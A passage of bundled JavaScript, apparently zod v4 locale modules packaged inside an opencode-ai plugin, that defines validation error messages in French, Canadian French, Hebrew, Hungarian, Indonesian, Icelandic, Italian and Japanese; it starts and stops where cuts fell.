      case "invalid_key":
        return `Cl\xE9 invalide dans ${issue3.origin}`;
      case "invalid_union":
        return "Entr\xE9e invalide";
      case "invalid_element":
        return `Valeur invalide dans ${issue3.origin}`;
      default:
        return `Entr\xE9e invalide`;
    }
  };
};
function fr_default2() {
  return {
    localeError: error60()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/fr-CA.js
var error61 = () => {
  const Sizable = {
    string: { unit: "caract\xE8res", verb: "avoir" },
    file: { unit: "octets", verb: "avoir" },
    array: { unit: "\xE9l\xE9ments", verb: "avoir" },
    set: { unit: "\xE9l\xE9ments", verb: "avoir" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType4 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "number";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "entr\xE9e",
    email: "adresse courriel",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "date-heure ISO",
    date: "date ISO",
    time: "heure ISO",
    duration: "dur\xE9e ISO",
    ipv4: "adresse IPv4",
    ipv6: "adresse IPv6",
    cidrv4: "plage IPv4",
    cidrv6: "plage IPv6",
    base64: "cha\xEEne encod\xE9e en base64",
    base64url: "cha\xEEne encod\xE9e en base64url",
    json_string: "cha\xEEne JSON",
    e164: "num\xE9ro E.164",
    jwt: "JWT",
    template_literal: "entr\xE9e"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Entr\xE9e invalide : attendu ${issue3.expected}, re\xE7u ${parsedType4(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Entr\xE9e invalide : attendu ${stringifyPrimitive2(issue3.values[0])}`;
        return `Option invalide : attendu l'une des valeurs suivantes ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "\u2264" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Trop grand : attendu que ${issue3.origin ?? "la valeur"} ait ${adj}${issue3.maximum.toString()} ${sizing.unit}`;
        return `Trop grand : attendu que ${issue3.origin ?? "la valeur"} soit ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? "\u2265" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Trop petit : attendu que ${issue3.origin} ait ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Trop petit : attendu que ${issue3.origin} soit ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `Cha\xEEne invalide : doit commencer par "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Cha\xEEne invalide : doit se terminer par "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Cha\xEEne invalide : doit inclure "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Cha\xEEne invalide : doit correspondre au motif ${_issue.pattern}`;
        return `${Nouns[_issue.format] ?? issue3.format} invalide`;
      }
      case "not_multiple_of":
        return `Nombre invalide : doit \xEAtre un multiple de ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Cl\xE9${issue3.keys.length > 1 ? "s" : ""} non reconnue${issue3.keys.length > 1 ? "s" : ""} : ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Cl\xE9 invalide dans ${issue3.origin}`;
      case "invalid_union":
        return "Entr\xE9e invalide";
      case "invalid_element":
        return `Valeur invalide dans ${issue3.origin}`;
      default:
        return `Entr\xE9e invalide`;
    }
  };
};
function fr_CA_default2() {
  return {
    localeError: error61()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/he.js
var error62 = () => {
  const Sizable = {
    string: { unit: "\u05D0\u05D5\u05EA\u05D9\u05D5\u05EA", verb: "\u05DC\u05DB\u05DC\u05D5\u05DC" },
    file: { unit: "\u05D1\u05D9\u05D9\u05D8\u05D9\u05DD", verb: "\u05DC\u05DB\u05DC\u05D5\u05DC" },
    array: { unit: "\u05E4\u05E8\u05D9\u05D8\u05D9\u05DD", verb: "\u05DC\u05DB\u05DC\u05D5\u05DC" },
    set: { unit: "\u05E4\u05E8\u05D9\u05D8\u05D9\u05DD", verb: "\u05DC\u05DB\u05DC\u05D5\u05DC" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType4 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "number";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u05E7\u05DC\u05D8",
    email: "\u05DB\u05EA\u05D5\u05D1\u05EA \u05D0\u05D9\u05DE\u05D9\u05D9\u05DC",
    url: "\u05DB\u05EA\u05D5\u05D1\u05EA \u05E8\u05E9\u05EA",
    emoji: "\u05D0\u05D9\u05DE\u05D5\u05D2'\u05D9",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u05EA\u05D0\u05E8\u05D9\u05DA \u05D5\u05D6\u05DE\u05DF ISO",
    date: "\u05EA\u05D0\u05E8\u05D9\u05DA ISO",
    time: "\u05D6\u05DE\u05DF ISO",
    duration: "\u05DE\u05E9\u05DA \u05D6\u05DE\u05DF ISO",
    ipv4: "\u05DB\u05EA\u05D5\u05D1\u05EA IPv4",
    ipv6: "\u05DB\u05EA\u05D5\u05D1\u05EA IPv6",
    cidrv4: "\u05D8\u05D5\u05D5\u05D7 IPv4",
    cidrv6: "\u05D8\u05D5\u05D5\u05D7 IPv6",
    base64: "\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05D1\u05D1\u05E1\u05D9\u05E1 64",
    base64url: "\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05D1\u05D1\u05E1\u05D9\u05E1 64 \u05DC\u05DB\u05EA\u05D5\u05D1\u05D5\u05EA \u05E8\u05E9\u05EA",
    json_string: "\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA JSON",
    e164: "\u05DE\u05E1\u05E4\u05E8 E.164",
    jwt: "JWT",
    template_literal: "\u05E7\u05DC\u05D8"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u05E7\u05DC\u05D8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF: \u05E6\u05E8\u05D9\u05DA ${issue3.expected}, \u05D4\u05EA\u05E7\u05D1\u05DC ${parsedType4(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u05E7\u05DC\u05D8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF: \u05E6\u05E8\u05D9\u05DA ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u05E7\u05DC\u05D8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF: \u05E6\u05E8\u05D9\u05DA \u05D0\u05D7\u05EA \u05DE\u05D4\u05D0\u05E4\u05E9\u05E8\u05D5\u05D9\u05D5\u05EA  ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u05D2\u05D3\u05D5\u05DC \u05DE\u05D3\u05D9: ${issue3.origin ?? "value"} \u05E6\u05E8\u05D9\u05DA \u05DC\u05D4\u05D9\u05D5\u05EA ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elements"}`;
        return `\u05D2\u05D3\u05D5\u05DC \u05DE\u05D3\u05D9: ${issue3.origin ?? "value"} \u05E6\u05E8\u05D9\u05DA \u05DC\u05D4\u05D9\u05D5\u05EA ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u05E7\u05D8\u05DF \u05DE\u05D3\u05D9: ${issue3.origin} \u05E6\u05E8\u05D9\u05DA \u05DC\u05D4\u05D9\u05D5\u05EA ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `\u05E7\u05D8\u05DF \u05DE\u05D3\u05D9: ${issue3.origin} \u05E6\u05E8\u05D9\u05DA \u05DC\u05D4\u05D9\u05D5\u05EA ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05DC\u05D0 \u05EA\u05E7\u05D9\u05E0\u05D4: \u05D7\u05D9\u05D9\u05D1\u05EA \u05DC\u05D4\u05EA\u05D7\u05D9\u05DC \u05D1"${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05DC\u05D0 \u05EA\u05E7\u05D9\u05E0\u05D4: \u05D7\u05D9\u05D9\u05D1\u05EA \u05DC\u05D4\u05E1\u05EA\u05D9\u05D9\u05DD \u05D1 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05DC\u05D0 \u05EA\u05E7\u05D9\u05E0\u05D4: \u05D7\u05D9\u05D9\u05D1\u05EA \u05DC\u05DB\u05DC\u05D5\u05DC "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u05DE\u05D7\u05E8\u05D5\u05D6\u05EA \u05DC\u05D0 \u05EA\u05E7\u05D9\u05E0\u05D4: \u05D7\u05D9\u05D9\u05D1\u05EA \u05DC\u05D4\u05EA\u05D0\u05D9\u05DD \u05DC\u05EA\u05D1\u05E0\u05D9\u05EA ${_issue.pattern}`;
        return `${Nouns[_issue.format] ?? issue3.format} \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF`;
      }
      case "not_multiple_of":
        return `\u05DE\u05E1\u05E4\u05E8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF: \u05D7\u05D9\u05D9\u05D1 \u05DC\u05D4\u05D9\u05D5\u05EA \u05DE\u05DB\u05E4\u05DC\u05D4 \u05E9\u05DC ${issue3.divisor}`;
      case "unrecognized_keys":
        return `\u05DE\u05E4\u05EA\u05D7${issue3.keys.length > 1 ? "\u05D5\u05EA" : ""} \u05DC\u05D0 \u05DE\u05D6\u05D5\u05D4${issue3.keys.length > 1 ? "\u05D9\u05DD" : "\u05D4"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\u05DE\u05E4\u05EA\u05D7 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF \u05D1${issue3.origin}`;
      case "invalid_union":
        return "\u05E7\u05DC\u05D8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF";
      case "invalid_element":
        return `\u05E2\u05E8\u05DA \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF \u05D1${issue3.origin}`;
      default:
        return `\u05E7\u05DC\u05D8 \u05DC\u05D0 \u05EA\u05E7\u05D9\u05DF`;
    }
  };
};
function he_default2() {
  return {
    localeError: error62()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/hu.js
var error63 = () => {
  const Sizable = {
    string: { unit: "karakter", verb: "legyen" },
    file: { unit: "byte", verb: "legyen" },
    array: { unit: "elem", verb: "legyen" },
    set: { unit: "elem", verb: "legyen" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType4 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "sz\xE1m";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "t\xF6mb";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "bemenet",
    email: "email c\xEDm",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO id\u0151b\xE9lyeg",
    date: "ISO d\xE1tum",
    time: "ISO id\u0151",
    duration: "ISO id\u0151intervallum",
    ipv4: "IPv4 c\xEDm",
    ipv6: "IPv6 c\xEDm",
    cidrv4: "IPv4 tartom\xE1ny",
    cidrv6: "IPv6 tartom\xE1ny",
    base64: "base64-k\xF3dolt string",
    base64url: "base64url-k\xF3dolt string",
    json_string: "JSON string",
    e164: "E.164 sz\xE1m",
    jwt: "JWT",
    template_literal: "bemenet"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\xC9rv\xE9nytelen bemenet: a v\xE1rt \xE9rt\xE9k ${issue3.expected}, a kapott \xE9rt\xE9k ${parsedType4(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\xC9rv\xE9nytelen bemenet: a v\xE1rt \xE9rt\xE9k ${stringifyPrimitive2(issue3.values[0])}`;
        return `\xC9rv\xE9nytelen opci\xF3: valamelyik \xE9rt\xE9k v\xE1rt ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `T\xFAl nagy: ${issue3.origin ?? "\xE9rt\xE9k"} m\xE9rete t\xFAl nagy ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elem"}`;
        return `T\xFAl nagy: a bemeneti \xE9rt\xE9k ${issue3.origin ?? "\xE9rt\xE9k"} t\xFAl nagy: ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `T\xFAl kicsi: a bemeneti \xE9rt\xE9k ${issue3.origin} m\xE9rete t\xFAl kicsi ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `T\xFAl kicsi: a bemeneti \xE9rt\xE9k ${issue3.origin} t\xFAl kicsi ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `\xC9rv\xE9nytelen string: "${_issue.prefix}" \xE9rt\xE9kkel kell kezd\u0151dnie`;
        if (_issue.format === "ends_with")
          return `\xC9rv\xE9nytelen string: "${_issue.suffix}" \xE9rt\xE9kkel kell v\xE9gz\u0151dnie`;
        if (_issue.format === "includes")
          return `\xC9rv\xE9nytelen string: "${_issue.includes}" \xE9rt\xE9ket kell tartalmaznia`;
        if (_issue.format === "regex")
          return `\xC9rv\xE9nytelen string: ${_issue.pattern} mint\xE1nak kell megfelelnie`;
        return `\xC9rv\xE9nytelen ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\xC9rv\xE9nytelen sz\xE1m: ${issue3.divisor} t\xF6bbsz\xF6r\xF6s\xE9nek kell lennie`;
      case "unrecognized_keys":
        return `Ismeretlen kulcs${issue3.keys.length > 1 ? "s" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\xC9rv\xE9nytelen kulcs ${issue3.origin}`;
      case "invalid_union":
        return "\xC9rv\xE9nytelen bemenet";
      case "invalid_element":
        return `\xC9rv\xE9nytelen \xE9rt\xE9k: ${issue3.origin}`;
      default:
        return `\xC9rv\xE9nytelen bemenet`;
    }
  };
};
function hu_default2() {
  return {
    localeError: error63()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/id.js
var error64 = () => {
  const Sizable = {
    string: { unit: "karakter", verb: "memiliki" },
    file: { unit: "byte", verb: "memiliki" },
    array: { unit: "item", verb: "memiliki" },
    set: { unit: "item", verb: "memiliki" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType4 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "number";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "input",
    email: "alamat email",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "tanggal dan waktu format ISO",
    date: "tanggal format ISO",
    time: "jam format ISO",
    duration: "durasi format ISO",
    ipv4: "alamat IPv4",
    ipv6: "alamat IPv6",
    cidrv4: "rentang alamat IPv4",
    cidrv6: "rentang alamat IPv6",
    base64: "string dengan enkode base64",
    base64url: "string dengan enkode base64url",
    json_string: "string JSON",
    e164: "angka E.164",
    jwt: "JWT",
    template_literal: "input"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Input tidak valid: diharapkan ${issue3.expected}, diterima ${parsedType4(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Input tidak valid: diharapkan ${stringifyPrimitive2(issue3.values[0])}`;
        return `Pilihan tidak valid: diharapkan salah satu dari ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Terlalu besar: diharapkan ${issue3.origin ?? "value"} memiliki ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elemen"}`;
        return `Terlalu besar: diharapkan ${issue3.origin ?? "value"} menjadi ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Terlalu kecil: diharapkan ${issue3.origin} memiliki ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Terlalu kecil: diharapkan ${issue3.origin} menjadi ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `String tidak valid: harus dimulai dengan "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `String tidak valid: harus berakhir dengan "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `String tidak valid: harus menyertakan "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `String tidak valid: harus sesuai pola ${_issue.pattern}`;
        return `${Nouns[_issue.format] ?? issue3.format} tidak valid`;
      }
      case "not_multiple_of":
        return `Angka tidak valid: harus kelipatan dari ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Kunci tidak dikenali ${issue3.keys.length > 1 ? "s" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Kunci tidak valid di ${issue3.origin}`;
      case "invalid_union":
        return "Input tidak valid";
      case "invalid_element":
        return `Nilai tidak valid di ${issue3.origin}`;
      default:
        return `Input tidak valid`;
    }
  };
};
function id_default2() {
  return {
    localeError: error64()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/is.js
var parsedType4 = (data) => {
  const t = typeof data;
  switch (t) {
    case "number": {
      return Number.isNaN(data) ? "NaN" : "n\xFAmer";
    }
    case "object": {
      if (Array.isArray(data)) {
        return "fylki";
      }
      if (data === null) {
        return "null";
      }
      if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
        return data.constructor.name;
      }
    }
  }
  return t;
};
var error65 = () => {
  const Sizable = {
    string: { unit: "stafi", verb: "a\xF0 hafa" },
    file: { unit: "b\xE6ti", verb: "a\xF0 hafa" },
    array: { unit: "hluti", verb: "a\xF0 hafa" },
    set: { unit: "hluti", verb: "a\xF0 hafa" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const Nouns = {
    regex: "gildi",
    email: "netfang",
    url: "vefsl\xF3\xF0",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO dagsetning og t\xEDmi",
    date: "ISO dagsetning",
    time: "ISO t\xEDmi",
    duration: "ISO t\xEDmalengd",
    ipv4: "IPv4 address",
    ipv6: "IPv6 address",
    cidrv4: "IPv4 range",
    cidrv6: "IPv6 range",
    base64: "base64-encoded strengur",
    base64url: "base64url-encoded strengur",
    json_string: "JSON strengur",
    e164: "E.164 t\xF6lugildi",
    jwt: "JWT",
    template_literal: "gildi"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Rangt gildi: \xDE\xFA sl\xF3st inn ${parsedType4(issue3.input)} \xFEar sem \xE1 a\xF0 vera ${issue3.expected}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Rangt gildi: gert r\xE1\xF0 fyrir ${stringifyPrimitive2(issue3.values[0])}`;
        return `\xD3gilt val: m\xE1 vera eitt af eftirfarandi ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Of st\xF3rt: gert er r\xE1\xF0 fyrir a\xF0 ${issue3.origin ?? "gildi"} hafi ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "hluti"}`;
        return `Of st\xF3rt: gert er r\xE1\xF0 fyrir a\xF0 ${issue3.origin ?? "gildi"} s\xE9 ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Of l\xEDti\xF0: gert er r\xE1\xF0 fyrir a\xF0 ${issue3.origin} hafi ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Of l\xEDti\xF0: gert er r\xE1\xF0 fyrir a\xF0 ${issue3.origin} s\xE9 ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `\xD3gildur strengur: ver\xF0ur a\xF0 byrja \xE1 "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `\xD3gildur strengur: ver\xF0ur a\xF0 enda \xE1 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\xD3gildur strengur: ver\xF0ur a\xF0 innihalda "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\xD3gildur strengur: ver\xF0ur a\xF0 fylgja mynstri ${_issue.pattern}`;
        return `Rangt ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `R\xF6ng tala: ver\xF0ur a\xF0 vera margfeldi af ${issue3.divisor}`;
      case "unrecognized_keys":
        return `\xD3\xFEekkt ${issue3.keys.length > 1 ? "ir lyklar" : "ur lykill"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Rangur lykill \xED ${issue3.origin}`;
      case "invalid_union":
        return "Rangt gildi";
      case "invalid_element":
        return `Rangt gildi \xED ${issue3.origin}`;
      default:
        return `Rangt gildi`;
    }
  };
};
function is_default2() {
  return {
    localeError: error65()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/it.js
var error66 = () => {
  const Sizable = {
    string: { unit: "caratteri", verb: "avere" },
    file: { unit: "byte", verb: "avere" },
    array: { unit: "elementi", verb: "avere" },
    set: { unit: "elementi", verb: "avere" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType5 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "numero";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "vettore";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "input",
    email: "indirizzo email",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "data e ora ISO",
    date: "data ISO",
    time: "ora ISO",
    duration: "durata ISO",
    ipv4: "indirizzo IPv4",
    ipv6: "indirizzo IPv6",
    cidrv4: "intervallo IPv4",
    cidrv6: "intervallo IPv6",
    base64: "stringa codificata in base64",
    base64url: "URL codificata in base64",
    json_string: "stringa JSON",
    e164: "numero E.164",
    jwt: "JWT",
    template_literal: "input"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Input non valido: atteso ${issue3.expected}, ricevuto ${parsedType5(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Input non valido: atteso ${stringifyPrimitive2(issue3.values[0])}`;
        return `Opzione non valida: atteso uno tra ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Troppo grande: ${issue3.origin ?? "valore"} deve avere ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elementi"}`;
        return `Troppo grande: ${issue3.origin ?? "valore"} deve essere ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Troppo piccolo: ${issue3.origin} deve avere ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Troppo piccolo: ${issue3.origin} deve essere ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Stringa non valida: deve iniziare con "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Stringa non valida: deve terminare con "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Stringa non valida: deve includere "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Stringa non valida: deve corrispondere al pattern ${_issue.pattern}`;
        return `Invalid ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Numero non valido: deve essere un multiplo di ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Chiav${issue3.keys.length > 1 ? "i" : "e"} non riconosciut${issue3.keys.length > 1 ? "e" : "a"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Chiave non valida in ${issue3.origin}`;
      case "invalid_union":
        return "Input non valido";
      case "invalid_element":
        return `Valore non valido in ${issue3.origin}`;
      default:
        return `Input non valido`;
    }
  };
};
function it_default2() {
  return {
    localeError: error66()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ja.js
var error67 = () => {
  const Sizable = {
    string: { unit: "\u6587\u5B57", verb: "\u3067\u3042\u308B" },
    file: { unit: "\u30D0\u30A4\u30C8", verb: "\u3067\u3042\u308B" },
    array: { unit: "\u8981\u7D20", verb: "\u3067\u3042\u308B" },
    set: { unit: "\u8981\u7D20", verb: "\u3067\u3042\u308B" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType5 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "\u6570\u5024";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u914D\u5217";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u5165\u529B\u5024",
    email: "\u30E1\u30FC\u30EB\u30A2\u30C9\u30EC\u30B9",
    url: "URL",
    emoji: "\u7D75\u6587\u5B57",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO\u65E5\u6642",
    date: "ISO\u65E5\u4ED8",
    time: "ISO\u6642\u523B",
    duration: "ISO\u671F\u9593",
    ipv4: "IPv4\u30A2\u30C9\u30EC\u30B9",
    ipv6: "IPv6\u30A2\u30C9\u30EC\u30B9",
    cidrv4: "IPv4\u7BC4\u56F2",
    cidrv6: "IPv6\u7BC4\u56F2",
    base64: "base64\u30A8\u30F3\u30B3\u30FC\u30C9\u6587\u5B57\u5217",
    base64url: "base64url\u30A8\u30F3\u30B3\u30FC\u30C9\u6587\u5B57\u5217",
    json_string: "JSON\u6587\u5B57\u5217",
    e164: "E.164\u756A\u53F7",
    jwt: "JWT",
    template_literal: "\u5165\u529B\u5024"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u7121\u52B9\u306A\u5165\u529B: ${issue3.expected}\u304C\u671F\u5F85\u3055\u308C\u307E\u3057\u305F\u304C\u3001${parsedType5(issue3.input)}\u304C\u5165\u529B\u3055\u308C\u307E\u3057\u305F`;
      case "invalid_value":
